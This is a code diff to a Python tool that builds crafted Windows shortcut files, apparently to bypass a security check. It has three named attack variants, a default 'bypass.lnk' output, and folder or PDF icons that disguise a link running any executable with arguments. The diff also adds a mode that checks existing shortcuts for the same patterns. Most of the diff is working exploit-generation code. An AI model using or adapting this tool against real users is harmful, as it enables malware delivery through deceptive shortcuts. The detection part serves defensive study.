@@ -42,7 +42,7 @@ def add_args_icon(lnk, arguments, icon):
 def generate_pathsegment(output, exe, arguments=None, icon=None):
     lnk = pylnk3.create(output)
     lnk.link_flags.IsUnicode = True
-    lnk.link_info = None
+    lnk.link_flags.HasLinkInfo = True
     levels = list(pylnk3.path_levels(exe))
     elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                 pylnk3.DriveEntry(levels[0])]
@@ -50,6 +50,7 @@ def generate_pathsegment(output, exe, arguments=None, icon=None):
     segment = segment_from_path(path)
     elements.append(segment)
     lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
+    lnk.specify_local_location(exe, pylnk3.DRIVE_FIXED, 2819051173)
     lnk.shell_item_id_list.items = elements
 
     add_args_icon(lnk, arguments, icon)
@@ -61,7 +62,7 @@ def generate_dot(output, exe, arguments=None, icon=None):
     exe += "."
     lnk = pylnk3.create(output)
     lnk.link_flags.IsUnicode = True
-    lnk.link_info = None
+    lnk.link_flags.HasLinkInfo = True
     levels = list(pylnk3.path_levels(exe))
     elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                 pylnk3.DriveEntry(levels[0])]
@@ -70,7 +71,7 @@ def generate_dot(output, exe, arguments=None, icon=None):
         elements.append(segment)            
     lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
     lnk.shell_item_id_list.items = elements
-
+    lnk.specify_local_location(exe, pylnk3.DRIVE_FIXED, 2819051173)
     add_args_icon(lnk, arguments, icon)
 
     print(f"Writing to: {output}")
@@ -82,7 +83,7 @@ def generate_relative(output, exe, arguments=None, icon=None):
         return
     lnk = pylnk3.create(output)
     lnk.link_flags.IsUnicode = True
-    lnk.link_info = None
+    lnk.link_flags.HasLinkInfo = True
     levels = list(pylnk3.path_levels(exe))
     elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_DOCUMENTS)]
     for level in levels[1:]:
@@ -90,6 +91,7 @@ def generate_relative(output, exe, arguments=None, icon=None):
         elements.append(segment)
     lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
     lnk.shell_item_id_list.items = elements
+    lnk.specify_local_location(exe, pylnk3.DRIVE_FIXED, 2819051173)
     lnk._set_relative_path(f".\\{exe}")
     
     add_args_icon(lnk, arguments, icon)
@@ -97,14 +99,58 @@ def generate_relative(output, exe, arguments=None, icon=None):
     print(f"Writing to: {output}")
     lnk.save()
 
+def computer_root(lnk):
+    for item in lnk.shell_item_id_list.items:
+        if type(item) == pylnk3.RootEntry:
+            return item.root == "MY_COMPUTER" or item.root == "USERPROFILE"
+
+def pathseg_vuln(lnk):
+    for item in lnk.shell_item_id_list.items:
+        if type(item) == pylnk3.PathSegmentEntry:
+            if item.full_name and item.full_name.count("\\") >= 2:
+                return True
+
+def has_vuln(path):
+    print("Warning: FPs or FNs are possible")
+    try:
+        lnk = pylnk3.parse(path)
+        lnk.path.endswith(".")
+        if lnk.path.endswith(".") or lnk.path.endswith(" "):
+            print(f"Vuln! (dot\space): {path}")
+            print(f'Path: "{lnk.path}"')
+            if lnk.link_flags.HasArguments: print(f"Args: {lnk.arguments}")
+            return True
+        elif lnk.relative_path and lnk.relative_path.startswith(".\\") and lnk.relative_path.count("\\") == 1 and not computer_root(lnk):
+            print(f"Vuln! (relative): {path}")
+            print(f'Path: "{lnk.path}"')
+            if lnk.link_flags.HasArguments: print(f"Args: {lnk.arguments}")
+            return True
+        elif pathseg_vuln(lnk):
+            print(f"Vuln! (pathsegment): {path}")
+            print(f'Path: "{lnk.path}"')
+            if lnk.link_flags.HasArguments: print(f"Args: {lnk.arguments}")
+        else:
+            print("Not vuln")
+    except:
+        print(f"Exception while processing {path}")
+
 def main():
     parser = argparse.ArgumentParser()
+    parser.add_argument('--input', help='Input LNK for vuln check')
     parser.add_argument('--output', help='Output link file name', default=r'bypass.lnk')
-    parser.add_argument('--executable', help='Path to executable', type=str, required=True)
+    parser.add_argument('--executable', help='Path to executable', type=str)
     parser.add_argument('--arguments', help='Arguments to executable', type=str)
     parser.add_argument('--icon', help='Icon to use', choices=['folder', 'pdf'])
     parser.add_argument('--variant', help='Attack variant to use', choices=['pathsegment', 'dot', 'relative'], default='pathsegment')
     args = parser.parse_args()
+
+    if args.input:
+        has_vuln(args.input)
+        return
+
+    if not args.executable:
+        print("--executable is a required parameter")
+        return
 
     if args.variant == "pathsegment":
         generate_pathsegment(args.output, args.executable, args.arguments, args.icon)
